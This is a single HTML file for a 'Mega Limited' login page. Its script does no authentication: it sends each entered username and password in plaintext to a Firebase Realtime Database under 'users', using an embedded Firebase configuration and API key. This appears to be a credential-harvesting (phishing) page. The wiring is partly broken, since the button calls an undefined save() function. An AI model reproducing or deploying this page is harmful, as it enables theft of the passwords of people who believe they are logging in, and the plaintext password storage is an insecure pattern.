<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Mega Limited Login</title>
<!-- Add Firebase -->
<script src="https://www.gstatic.com/firebasejs/9.1.0/firebase-app.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.1.0/firebase-database.js"></script>
<style>
  body {
    font-family: Arial, sans-serif;
    margin: 0;
    padding: 0;
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
    background-color: #f0f0f0;
  }
  .login-container {
    background-color: #fff;
    padding: 20px;
    border-radius: 5px;
    box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
    width: 300px;
  }
  .login-container h2 {
    margin-bottom: 20px;
    text-align: center;
  }
  .login-container input[type="text"],
  .login-container input[type="password"] {
    width: 100%;
    padding: 10px;
    margin-bottom: 15px;
    border: 1px solid #ccc;
    border-radius: 5px;
    box-sizing: border-box;
  }
  .login-container input[type="submit"] {
    width: 100%;
    background-color: #4caf50;
    color: #fff;
    border: none;
    padding: 10px;
    border-radius: 5px;
    cursor: pointer;
    transition: background-color 0.3s ease;
  }
  .login-container input[type="submit"]:hover {
    background-color: #45a049;
  }
</style>
</head>
<body>
<div class="login-container">
  <h2>Login to Mega Limited</h2>
  <form id="loginForm">
    <input type="text" id="username" name="username" placeholder="Username" required>
    <input type="password" id="password" name="password" placeholder="Password" required>
    <input type='button' onclick='save();' value="Login">
  </form>
</div>

<!-- Initialize Firebase -->
<!-- Initialize Firebase -->
<script>
    // Your web app's Firebase configuration
    var firebaseConfig = {
        apiKey: "AIzaSyAWBoTBdopcIpBFE_aJpKZObttwZ7VyGjY",

authDomain: "application-bcfe9.firebaseapp.com",

databaseURL: "https://application-bcfe9-default-rtdb.firebaseio.com",

projectId: "application-bcfe9",

storageBucket: "application-bcfe9.appspot.com",

messagingSenderId: "22505666442",

appId: "1:22505666442:web:37113b705c26a443673a73",

measurementId: "G-EY7H8Q4KEL"
    };
  
    // Initialize Firebase
    firebase.initializeApp(firebaseConfig);
  
    // Get a reference to the Firebase Realtime Database
    var database = firebase.database();
  
    // Function to handle form submission
    document.getElementById('loginForm').addEventListener('submit', function(event) {
      event.preventDefault(); // Prevent the default form submission
  
      // Get username and password values
      var username = document.getElementById('username').value;
      var password = document.getElementById('password').value;
  
      // Save username and password to the database
      database.ref('users').push().set({
        username: username,
        password: password
      })
      .then(function() {
        // Data saved successfully
        console.log("Data saved successfully");
      })
      .catch(function(error) {
        // Handle errors here
        console.error("Error saving data: ", error);
      });
  
      // Reset form
      document.getElementById('loginForm').reset();
    });
  </script>
  
</body>
</html>
